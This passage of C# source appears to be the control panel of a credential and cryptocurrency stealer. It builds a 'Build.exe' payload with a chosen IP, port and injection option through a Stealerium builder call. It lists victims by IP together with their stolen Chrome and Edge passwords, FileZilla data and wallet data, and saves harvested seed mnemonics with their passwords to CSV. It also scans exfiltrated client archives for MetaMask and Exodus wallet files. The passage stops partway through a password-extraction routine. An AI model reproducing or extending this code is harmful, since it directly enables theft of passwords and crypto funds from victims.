                // Refresh the grid
                gridControl2.RefreshDataSource();

                // Focus on the new row
                var gridView = gridControl2.MainView as DevExpress.XtraGrid.Views.Grid.GridView;
                if (gridView != null && dataSource.Count > 0)
                {
                    gridView.FocusedRowHandle = dataSource.Count - 1;
                }

                // Optional: Save data to file
                SaveMnemonicData();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error updating regular mnemonic grid: {ex.Message}");
            }
        }

        private void UpdateAtomicMnemonicGrid(string atomicMnemonic, string atomicPassword)
        {
            try
            {
                // Get the data source for gridControl3
                var dataSource = gridControl3.DataSource as System.ComponentModel.BindingList<AtomicMnemonicData>;
                if (dataSource == null)
                {
                    // Initialize if not already set
                    dataSource = new System.ComponentModel.BindingList<AtomicMnemonicData>();
                    gridControl3.DataSource = dataSource;
                }

                // Add the new data
                dataSource.Add(new AtomicMnemonicData
                {
                    AtomicMnemonic = atomicMnemonic,
                    AtomicPassword = atomicPassword,
                    ReceivedTime = DateTime.Now
                });

                // Refresh the grid
                gridControl3.RefreshDataSource();

                // Focus on the new row
                var gridView = gridControl3.MainView as DevExpress.XtraGrid.Views.Grid.GridView;
                if (gridView != null && dataSource.Count > 0)
                {
                    gridView.FocusedRowHandle = dataSource.Count - 1;
                }

                // Optional: Save data to file
                SaveAtomicMnemonicData();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error updating atomic mnemonic grid: {ex.Message}");
            }
        }

        // Optional: Add these data classes if they don't already exist

        public class MnemonicData
        {
            public string Mnemonic { get; set; }
            public string Password { get; set; }
            public DateTime ReceivedTime { get; set; }
        }

        public class AtomicMnemonicData
        {
            public string AtomicMnemonic { get; set; }
            public string AtomicPassword { get; set; }
            public DateTime ReceivedTime { get; set; }
        }

        // Optional: Add these methods to save the data to files

        private void SaveMnemonicData()
        {
            try
            {
                var dataSource = gridControl2.DataSource as System.ComponentModel.BindingList<MnemonicData>;
                if (dataSource != null && dataSource.Count > 0)
                {
                    string filePath = Path.Combine(Application.StartupPath, "MnemonicData.csv");
                    using (StreamWriter sw = new StreamWriter(filePath, false))
                    {
                        sw.WriteLine("Mnemonic,Password,ReceivedTime");
                        foreach (var item in dataSource)
                        {
                            sw.WriteLine($"\"{item.Mnemonic}\",\"{item.Password}\",\"{item.ReceivedTime}\"");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error saving mnemonic data: {ex.Message}");
            }
        }

        private void SaveAtomicMnemonicData()
        {
            try
            {
                var dataSource = gridControl3.DataSource as System.ComponentModel.BindingList<AtomicMnemonicData>;
                if (dataSource != null && dataSource.Count > 0)
                {
                    string filePath = Path.Combine(Application.StartupPath, "AtomicMnemonicData.csv");
                    using (StreamWriter sw = new StreamWriter(filePath, false))
                    {
                        sw.WriteLine("AtomicMnemonic,AtomicPassword,ReceivedTime");
                        foreach (var item in dataSource)
                        {
                            sw.WriteLine($"\"{item.AtomicMnemonic}\",\"{item.AtomicPassword}\",\"{item.ReceivedTime}\"");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error saving atomic mnemonic data: {ex.Message}");
            }
        }
        // Helper method to log messages
        private void LogMessage(string message)
        {
            try
            {
                string logFile = "server_log.txt";
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                File.AppendAllText(logFile, $"[{timestamp}] {message}{Environment.NewLine}");
            }
            catch { /* Ignore errors in logging */ }
        }


        private void LogError(string errorMessage)
        {
            try
            {
                string logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "error_log.txt");
                File.AppendAllText(logPath, $"[{DateTime.Now}] {errorMessage}\r\n");
            }
            catch
            {
                // Last-resort fallback - cannot even log the error
            }
        }
        private void CleanupMemory()
        {
            GC.Collect(2, GCCollectionMode.Optimized, false);
        }



        private async Task ShowReportFormAsync()
        {
            // Create a single task for UI operations
            ReportFrm reportForm = await Task.Run(() =>
            {
                ReportFrm form = null;
                this.Invoke((MethodInvoker)(() =>
                {
                    form = new ReportFrm();
                    form.TopMost = true;

                    // Set custom position
                    int screenWidth = Screen.PrimaryScreen.WorkingArea.Width;
                    int formWidth = form.Width;

                    int x = (screenWidth - formWidth) / 2;
                    int y = 20; // Distance from top of screen

                    form.StartPosition = FormStartPosition.Manual;
                    form.Location = new Point(x, y);
                    form.FormBorderStyle = FormBorderStyle.None;
                    form.Opacity = 1.0;
                    form.Show();
                }));
                return form;
            });

            // Wait 5 seconds
            await Task.Delay(5000);

            // Use a more efficient fade-out approach with fewer UI updates
            const int fadeSteps = 5; // Reduce from 10 to 5 steps

            for (int i = fadeSteps; i >= 0; i--)
            {
                double opacity = (double)i / fadeSteps;
                await Task.Delay(100); // Increase delay between steps

                if (reportForm != null && !reportForm.IsDisposed)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            this.Invoke((MethodInvoker)(() =>
                            {
                                if (!reportForm.IsDisposed)
                                    reportForm.Opacity = opacity;
                            }));
                        }
                        catch { /* Form might have been closed already */ }
                    });
                }
            }

            // Close form
            await Task.Run(() =>
            {
                try
                {
                    this.Invoke((MethodInvoker)(() =>
                    {
                        if (reportForm != null && !reportForm.IsDisposed)
                        {
                            reportForm.Close();
                            reportForm.Dispose();
                        }
                    }));
                }
                catch { /* Form might have been closed already */ }
            });
        }
        private void SaveData()
        {
            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientData.txt");

            using (StreamWriter writer = new StreamWriter(filePath, false))
            {
                // Save label values
                var labels = new[]
                {
            label2, label5, label8, label11, label43, label46, label49, label52,
            label57, label61, label65, label70, uscount, italycount, canadacount,
            germanycount, romaniacount, swedencount, chinacount, othercount
        };
                foreach (var label in labels)
                {
                    writer.WriteLine($"{label.Name}={label.Text}");
                }

                // Save GridControl items
                writer.WriteLine("GridDataStart");
                var dataSource = gridControl1.DataSource as System.ComponentModel.BindingList<ClientData>;
                if (dataSource != null)
                {
                    foreach (var item in dataSource)
                    {
                        var line = string.Join("|", new string[] {
                    item.IP, item.Country, item.OS, item.FileType, item.FileSize,
                    item.Exodus, item.Blockchain, item.Binance, item.MetaMask,
                    item.FileZilla, item.EdgePasswords, item.ChromePasswords, item.Files
                });
                        writer.WriteLine(line);
                    }
                }
                writer.WriteLine("GridDataEnd");
            }
        }
        private void LoadData()
        {
            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientData.txt");

            if (!File.Exists(filePath))
                return;

            using (StreamReader reader = new StreamReader(filePath))
            {
                string line;
                bool isGridData = false;
                var dataSource = gridControl1.DataSource as System.ComponentModel.BindingList<ClientData>;

                while ((line = reader.ReadLine()) != null)
                {
                    // Check for GridData start and end markers
                    if (line == "GridDataStart")
                    {
                        isGridData = true;
                        continue;
                    }
                    if (line == "GridDataEnd")
                    {
                        isGridData = false;
                        continue;
                    }

                    if (isGridData && dataSource != null)
                    {
                        // Load GridControl items
                        var columns = line.Split('|');
                        if (columns.Length >= 13)
                        {
                            dataSource.Add(new ClientData
                            {
                                IP = columns[0],
                                Country = columns[1],
                                OS = columns[2],
                                FileType = columns[3],
                                FileSize = columns[4],
                                Exodus = columns[5],
                                Blockchain = columns[6],
                                Binance = columns[7],
                                MetaMask = columns[8],
                                FileZilla = columns[9],
                                EdgePasswords = columns[10],
                                ChromePasswords = columns[11],
                                Files = columns[12]
                            });
                        }
                    }
                    else
                    {
                        // Load label values
                        var parts = line.Split('=');
                        if (parts.Length == 2)
                        {
                            string labelName = parts[0];
                            string labelValue = parts[1];

                            var label = Controls.Find(labelName, true).FirstOrDefault() as Label;
                            if (label != null)
                            {
                                label.Text = labelValue;
                            }
                        }
                    }
                }

                // Refresh the data source to show all loaded items
                if (dataSource != null)
                {
                    gridControl1.RefreshDataSource();
                }
            }
            CleanupMemory();
        }

        private void SaveGridControlData()
        {
            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientInfos.txt");
            var dataSource = gridControl1.DataSource as System.ComponentModel.BindingList<ClientData>;

            if (dataSource != null)
            {
                using (StreamWriter writer = new StreamWriter(filePath, false))
                {
                    foreach (var item in dataSource)
                    {
                        var line = string.Join("|", new string[] {
                    item.IP ?? "",
                    item.Country ?? "",
                    item.OS ?? "",
                    item.FileType ?? "",
                    item.FileSize ?? "",
                    item.Exodus ?? "",
                    item.Blockchain ?? "",
                    item.Binance ?? "",
                    item.MetaMask ?? "",
                    item.FileZilla ?? "",
                    item.EdgePasswords ?? "",
                    item.ChromePasswords ?? "",
                    item.Files ?? ""
                });
                        writer.WriteLine(line);
                    }
                }
            }
        }

        private void LoadGridControlData()
        {
            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientInfos.txt");
            if (File.Exists(filePath))
            {
                var dataSource = gridControl1.DataSource as System.ComponentModel.BindingList<ClientData>;
                if (dataSource == null)
                {
                    dataSource = new System.ComponentModel.BindingList<ClientData>();
                    gridControl1.DataSource = dataSource;
                }

                using (StreamReader reader = new StreamReader(filePath))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                    {
                        var columns = line.Split('|');

                        // Ensure we have all required columns
                        if (columns.Length >= 13)
                        {
                            dataSource.Add(new ClientData
                            {
                                IP = columns[0],
                                Country = columns[1],
                                OS = columns[2],
                                FileType = columns[3],
                                FileSize = columns[4],
                                Exodus = columns[5],
                                Blockchain = columns[6],
                                Binance = columns[7],
                                MetaMask = columns[8],
                                FileZilla = columns[9],
                                EdgePasswords = columns[10],
                                ChromePasswords = columns[11],
                                Files = columns[12]
                            });
                        }
                    }
                }

                // Refresh the grid to display the loaded data
                gridControl1.RefreshDataSource();
            }
        }



        private async Task<string> GetCountryFromIPAsync(string ipAddress)
        {
            try
            {
                // Reuse static HttpClient instead of creating a new one each time
                string url = $"https://ipinfo.io/{ipAddress}/json";

                // Add timeout to prevent hanging requests
                var cts = new CancellationTokenSource();
                cts.CancelAfter(TimeSpan.FromSeconds(5));

                HttpResponseMessage response = await staticHttpClient.GetAsync(url, cts.Token);
                response.EnsureSuccessStatusCode();
                string responseBody = await response.Content.ReadAsStringAsync();

                // Use try-parse pattern to safely handle JSON
                try
                {
                    var jsonObject = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, string>>(responseBody);
                    return jsonObject?.ContainsKey("country") == true ? jsonObject["country"] : "Unknown";
                }
                catch
                {
                    return "Unknown";
                }
            }
            catch
            {
                return "Unknown";
            }
        }


        // Helper method to safely invoke on the UI thread
        private Task InvokeAsync(Action action)
        {
            return Task.Run(() =>
            {
                if (InvokeRequired)
                    Invoke(action);
                else
                    action();
            });
        }

        private void countlistview1_Tick(object sender, EventArgs e)
        {
            var dataSource = gridControl1.DataSource as System.ComponentModel.BindingList<ClientData>;
            int itemCount = dataSource != null ? dataSource.Count : 0;

            // Update label2 and label11 with the item count
            label2.Text = $"{itemCount}";
            label11.Text = $"{itemCount}";
        }

        // stop : 
        private void simpleButton2_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox21_Click(object sender, EventArgs e)
        {
        }

        private void counting_Tick(object sender, EventArgs e)
        {


        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Initialize GridControl with optimized settings
            InitializeGridControl();
            InitializeGridControl4();
            InitializeGridControl5();
            InitializeGridControl6();

            // Generate random string for textEdit5
            int length = 10;
            string randomString = GenerateRandomString(length);
            textEdit5.Text = randomString;

            // Create Clients directory if it doesn't exist
            Directory.CreateDirectory("Clients");

            // Apply GridControl performance optimizations
            OptimizeGridControlPerformance();

            // Load data into the GridControl
            LoadData();

            // Update UI text
            UpdateUIText();
        }


        /// <summary>
        /// Optimizes GridControl for better performance and smoother scrolling
        /// </summary>
        private void OptimizeGridControlPerformance()
        {
            // Get the grid view
            var gridView = gridControl1.MainView as DevExpress.XtraGrid.Views.Grid.GridView;
            if (gridView == null) return;

            // General optimization settings
            gridView.OptionsBehavior.Editable = false;
            gridView.OptionsSelection.EnableAppearanceFocusedCell = false;
            gridView.OptionsView.ShowGroupPanel = false;
            gridView.OptionsView.ShowIndicator = true;

            // Scroll/Rendering optimizations
            gridView.OptionsView.ColumnAutoWidth = false;
            gridView.OptionsView.RowAutoHeight = false;
            gridView.OptionsView.ShowHorizontalLines = DevExpress.Utils.DefaultBoolean.False;
            gridView.OptionsView.ShowVerticalLines = DevExpress.Utils.DefaultBoolean.False;

            // Buffer settings - similar to ListView's double buffering
            gridView.OptionsDetail.EnableMasterViewMode = false;
            gridView.OptionsCustomization.AllowFilter = false;
            gridView.OptionsFilter.AllowFilterEditor = false;

            // Scrolling optimization
            gridView.OptionsScrollAnnotations.ShowFocusedRow = DevExpress.Utils.DefaultBoolean.False;
            gridView.OptionsScrollAnnotations.ShowSelectedRows = DevExpress.Utils.DefaultBoolean.False;

            // Best for handling large datasets
            gridView.OptionsView.EnableAppearanceEvenRow = false;
            gridView.OptionsView.EnableAppearanceOddRow = false;

            // Memory management
            gridControl1.ForceInitialize();
            gridControl1.UseEmbeddedNavigator = false;

            // Optimal data loading - prevents UI freezes during data load
            gridControl1.UseDirectXPaint = DevExpress.Utils.DefaultBoolean.True;


            // Apply best width for columns (equivalent to ListView's column width setting)
            gridView.BestFitColumns();

            // Set scroll to top
            gridView.TopRowIndex = 0;
        }

        /// <summary>
        /// Creates or replaces the data source with a fresh BindingList to ensure clean start
        /// </summary>
        private void InitializeGridControlDataSource()
        {
            // Create a fresh BindingList for the data source
            var dataSource = new System.ComponentModel.BindingList<ClientData>();

            // Set the data source to the grid control
            gridControl1.DataSource = dataSource;

            // Force the grid to update its visual appearance
            gridControl1.RefreshDataSource();
        }

        /// <summary>
        /// Handles exceptions that might occur during GridControl operations
        /// </summary>
        private void HandleGridControlExceptions(Action action)
        {
            try
            {
                action();
            }
            catch (OutOfMemoryException)
            {
                // Handle memory issues
                GC.Collect();
                GC.WaitForPendingFinalizers();
                LogError("Out of memory error occurred while working with GridControl");
            }
            catch (Exception ex)
            {
                // Handle other exceptions
                LogError($"Grid control error: {ex.Message}");
            }
        }
        private void Form1_Resize(object sender, EventArgs e)
        {

        }

        private void panelControl9_Paint(object sender, PaintEventArgs e)
        {

        }

        private void simpleButton13_Click(object sender, EventArgs e)
        {
            try
            {
                // Validate inputs
                if (string.IsNullOrWhiteSpace(textEdit3.Text) || string.IsNullOrWhiteSpace(textEdit4.Text))
                {
                    MessageBox.Show("IP and Port must be specified.");
                    return;
                }
                // Try to parse port to validate it
                if (!int.TryParse(textEdit4.Text, out _))
                {
                    MessageBox.Show("Port must be a valid number.");
                    return;
                }

                // Determine injection setting based on checkEdit1
                string injValue = checkEdit1.Checked ? "1" : "0";

                // Build with the injection setting
                Stealerium.Builder.Build.ModifyAndSaveAssembly(textEdit3.Text, textEdit4.Text, injValue, "Build.exe");
                MessageBox.Show(
  "Build completed successfully!\n\n" +
  "• Output: " + "Build.exe" + "\n" +
  "A backup of the original file was created at:\n",
  "Build Success",
  MessageBoxButtons.OK,
  MessageBoxIcon.Information
);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Build Failed: {ex.Message}");
            }
        }



        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void panelControl28_Paint(object sender, PaintEventArgs e)
        {

        }

        private void accordionControlElement4_Click(object sender, EventArgs e)
        {

        }

        private void xtraTabControl1_Click(object sender, EventArgs e)
        {

        }

        private void accordionControlElement2_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 0;


        }

        private void accordionControlElement3_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 1;

        }

        private void accordionControlElement6_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 2;

        }

        private void accordionControlElement7_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 3;

        }

        private void accordionControlElement9_Click(object sender, EventArgs e)
        {

            Environment.Exit(1);
        }

        private void genkey_Tick(object sender, EventArgs e)
        {
            int length = 10;
            string randomString = GenerateRandomString(length);
            textEdit5.Text = randomString;
        }


        static Random random = new Random();
        public static string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            char[] stringChars = new char[length];

            for (int i = 0; i < length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            return new string(stringChars);
        }

        private void simpleButton14_Click(object sender, EventArgs e)
        {

        }

        private void listView1_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            // Background for non-selected items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(32, 32, 32)), e.Bounds); // Default background color
            }

            // Highlight selected item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw text for item
            e.DrawText(TextFormatFlags.Left);
        }

        private void listView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            // Background for non-selected sub-items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(32, 32, 32)), e.Bounds); // Default background color
            }

            // Highlight selected sub-item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }


        }

        private void listView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            // Column header background color
            e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(32, 32, 32)), e.Bounds); // Column background

        }

        private void listView2_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            // Background for non-selected items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(32, 32, 32)), e.Bounds); // Default background color
            }

            // Highlight selected item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw text for item
            e.DrawText(TextFormatFlags.Left);
        }

        private void listView3_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            // Background for non-selected items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(32, 32, 32)), e.Bounds); // Default background color
            }

            // Highlight selected item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw text for item
            e.DrawText(TextFormatFlags.Left);
        }

        private void listView4_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            // Background for non-selected items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(32, 32, 32)), e.Bounds); // Default background color
            }

            // Highlight selected item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw text for item
            e.DrawText(TextFormatFlags.Left);
        }

        private void listView2_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            // Background for non-selected sub-items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(32, 32, 32)), e.Bounds); // Default background color
            }

            // Highlight selected sub-item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw sub-item text

        }

        private void listView3_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            // Background for non-selected sub-items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(32, 32, 32)), e.Bounds); // Default background color
            }

            // Highlight selected sub-item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw sub-item text

        }

        private void listView4_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            // Background for non-selected sub-items
            if (!e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(32, 32, 32)), e.Bounds); // Default background color
            }

            // Highlight selected sub-item
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(54, 71, 99)), e.Bounds); // Highlight color
            }

            // Draw sub-item text

        }

        private void listView4_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            // Column header background color
            e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(32, 32, 32)), e.Bounds); // Column background

        }

        private void listView3_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            // Column header background color
            e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(32, 32, 32)), e.Bounds); // Column background

        }

        private void listView2_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            // Column header background color
            e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(32, 32, 32)), e.Bounds); // Column background

        }

        private void liveChart1_Load(object sender, EventArgs e)
        {

        }
        private async void simpleButton12_Click(object sender, EventArgs e)
        {
            try
            {
                // Clear existing data in gridControl4
                if (gridControl4.DataSource is List<WalletData> dataSource)
                {
                    dataSource.Clear();
                }
                else
                {
                    gridControl4.DataSource = new List<WalletData>();
                }

                // Refresh grid to show empty state
                gridControl4.RefreshDataSource();

                simpleButton12.Enabled = false;

                string clientsFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Clients");

                if (!Directory.Exists(clientsFolder))
                {
                    MessageBox.Show("Clients folder not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                string[] zipFiles = Directory.GetFiles(clientsFolder, "*.zip");

                if (zipFiles.Length == 0)
                {
                    MessageBox.Show("No zip files found in Clients folder.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return;
                }

                // Dictionary to store results with more details
                Dictionary<string, string> results = new Dictionary<string, string>();

                try
                {
                    await Task.Run(() =>
                    {
                        int processedCount = 0;
                        object lockObj = new object(); // For thread-safe updates

                        // Process files in parallel for speed
                        Parallel.ForEach(zipFiles, new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount }, zipFile =>
                        {
                            try
                            {
                                string ip = Path.GetFileNameWithoutExtension(zipFile);
                                bool foundMetaMask = false;

                                // Check for MetaMask in the zip file
                                using (System.IO.Compression.ZipArchive archive = System.IO.Compression.ZipFile.OpenRead(zipFile))
                                {
                                    // Look specifically for MetaMask identifiers
                                    foundMetaMask = archive.Entries.Any(entry =>
                                        entry.FullName.Contains("MetaMask") ||
                                        entry.FullName.Contains("nkbihfbeogaeaoehlefnkodbefgpgknn") || // MetaMask extension ID
                                        (entry.FullName.Contains("Local Extension Settings") &&
                                         entry.FullName.Contains("nkbihfbeogaeaoehlefnkodbefgpgknn")) ||
                                        entry.FullName.Contains("metamask") ||
                                        entry.FullName.EndsWith("metamask.dat") ||
                                        entry.FullName.EndsWith("log_metamask.txt")
                                    );
                                }

                                // If we found MetaMask, add to results
                                if (foundMetaMask)
                                {
                                    lock (lockObj)
                                    {
                                        results[ip] = "MetaMask";
                                    }
                                }

                                lock (lockObj)
                                {
                                    processedCount++;
                                }
                            }
                            catch (Exception ex)
                            {
                                LogError($"Error processing {zipFile}: {ex.Message}");
                            }
                        });

                        // Log completion
                        LogError($"Processed {processedCount} of {zipFiles.Length} zip files. Found {results.Count} with MetaMask.");
                    });

                    // Create data source for the grid
                    var walletDataList = new List<WalletData>();

                    // Update data source with results
                    foreach (var ipWallet in results)
                    {
                        string ip = ipWallet.Key;
                        string wallet = ipWallet.Value;

                        walletDataList.Add(new WalletData
                        {
                            IP = ip,
                            Wallet = wallet,
                            Dispose = "" // Initially empty, can be populated by user
                        });
                    }

                    // Set the data source to the grid
                    gridControl4.DataSource = walletDataList;

                    // Refresh the grid to display new data
                    gridControl4.RefreshDataSource();

                    // Update status
                    label96.Text = $"{results.Count}";

                    if (results.Count > 0)
                    {
                        // Sort by IP
                        if (gridControl4.MainView is GridView gridView)
                        {
                            gridView.Columns["IP"].SortOrder = DevExpress.Data.ColumnSortOrder.Ascending;
                        }
                    }
                    else
                    {
                        MessageBox.Show("No MetaMask wallets found in any client files.", "Search Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    LogError($"simpleButton12_Click error: {ex.Message}");
                }
                finally
                {
                    simpleButton12.Enabled = true;
                    CleanupMemory();
                }
            }
            catch (Exception ex) // Added missing catch block
            {
                MessageBox.Show($"Outer error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LogError($"simpleButton12_Click outer error: {ex.Message}");
                simpleButton12.Enabled = true;
            }
        }
        public class WalletData
        {
            public string IP { get; set; }
            public string Wallet { get; set; }
            public string Dispose { get; set; }
        }
        private async void simpleButton11_Click(object sender, EventArgs e)
        {
            try
            {
                // Clear existing data in gridControl5
                if (gridControl5.DataSource is List<WalletData> dataSource)
                {
                    dataSource.Clear();
                }
                else
                {
                    gridControl5.DataSource = new List<WalletData>();
                }

                // Refresh grid to show empty state
                gridControl5.RefreshDataSource();

                simpleButton11.Enabled = false;

                string clientsFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Clients");

                if (!Directory.Exists(clientsFolder))
                {
                    MessageBox.Show("Clients folder not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                string[] zipFiles = Directory.GetFiles(clientsFolder, "*.zip");

                if (zipFiles.Length == 0)
                {
                    MessageBox.Show("No zip files found in Clients folder.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return;
                }

                // Dictionary to store results
                Dictionary<string, string> results = new Dictionary<string, string>();

                try
                {
                    await Task.Run(() =>
                    {
                        int processedCount = 0;
                        object lockObj = new object(); // For thread-safe updates

                        // Process files in parallel for speed
                        Parallel.ForEach(zipFiles, new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount }, zipFile =>
                        {
                            try
                            {
                                string ip = Path.GetFileNameWithoutExtension(zipFile);
                                bool foundExodus = false;

                                // Check for Exodus in the zip file
                                using (System.IO.Compression.ZipArchive archive = System.IO.Compression.ZipFile.OpenRead(zipFile))
                                {
                                    // Look specifically for Exodus identifiers
                                    foundExodus = archive.Entries.Any(entry =>
                                        entry.FullName.Contains("Exodus") ||
                                        entry.FullName.Contains("exodus") ||
                                        entry.FullName.EndsWith("exodus.wallet") ||
                                        entry.FullName.EndsWith("exodus.conf") ||
                                        entry.FullName.Contains("AppData/Roaming/Exodus") ||
                                        entry.FullName.Contains("AppData\\Roaming\\Exodus") ||
                                        entry.FullName.Contains("/.config/exodus") ||
                                        entry.FullName.Contains("\\.config\\exodus") ||
                                        entry.FullName.Contains("/Library/Application Support/Exodus") ||
                                        entry.FullName.Contains("exodusapp") ||
                                        entry.FullName.Contains("exodus-core")
                                    );
                                }

                                // If we found Exodus, add to results
                                if (foundExodus)
                                {
                                    lock (lockObj)
                                    {
                                        results[ip] = "Exodus";
                                    }
                                }

                                lock (lockObj)
                                {
                                    processedCount++;
                                }
                            }
                            catch (Exception ex)
                            {
                                LogError($"Error processing {zipFile}: {ex.Message}");
                            }
                        });

                        // Log completion
                        LogError($"Processed {processedCount} of {zipFiles.Length} zip files. Found {results.Count} with Exodus.");
                    });

                    // Create data source for the grid
                    var walletDataList = new List<WalletData>();

                    // Update data source with results
                    foreach (var ipWallet in results)
                    {
                        string ip = ipWallet.Key;
                        string wallet = ipWallet.Value;

                        walletDataList.Add(new WalletData
                        {
                            IP = ip,
                            Wallet = wallet,
                            Dispose = "" // Initially empty, can be populated by user
                        });
                    }

                    // Set the data source to the grid
                    gridControl5.DataSource = walletDataList;

                    // Refresh the grid to display new data
                    gridControl5.RefreshDataSource();

                    // Update status
                    label95.Text = $"{results.Count}";

                    if (results.Count > 0)
                    {
                        // Sort by IP
                        if (gridControl5.MainView is GridView gridView)
                        {
                            gridView.Columns["IP"].SortOrder = DevExpress.Data.ColumnSortOrder.Ascending;
                        }
                    }
                    else
                    {
                        MessageBox.Show("No Exodus wallets found in any client files.", "Search Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    LogError($"simpleButton11_Click error: {ex.Message}");
                }
                finally
                {
                    simpleButton11.Enabled = true;
                    CleanupMemory();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Outer error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LogError($"simpleButton11_Click outer error: {ex.Message}");
                simpleButton11.Enabled = true;
            }
        }

        private async void simpleButton8_Click(object sender, EventArgs e)
        {
            try
            {
                // Clear existing data in gridControl6
                if (gridControl6.DataSource is List<CredentialData> dataSource)
                {
                    dataSource.Clear();
                    gridControl6.RefreshDataSource();
                }
                else
                {
                    gridControl6.DataSource = new List<CredentialData>();
                }

                simpleButton8.Enabled = false;
                label94.Text = "0";

                string clientsFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Clients");

                if (!Directory.Exists(clientsFolder))
                {
                    MessageBox.Show("Clients folder not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                string[] zipFiles = Directory.GetFiles(clientsFolder, "*.zip");

                if (zipFiles.Length == 0)
                {
                    MessageBox.Show("No zip files found in Clients folder.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return;
                }

                // Create temporary directory for extraction
                string tempDir = Path.Combine(Path.GetTempPath(), "PasswordExtract_" + Guid.NewGuid().ToString().Substring(0, 8));
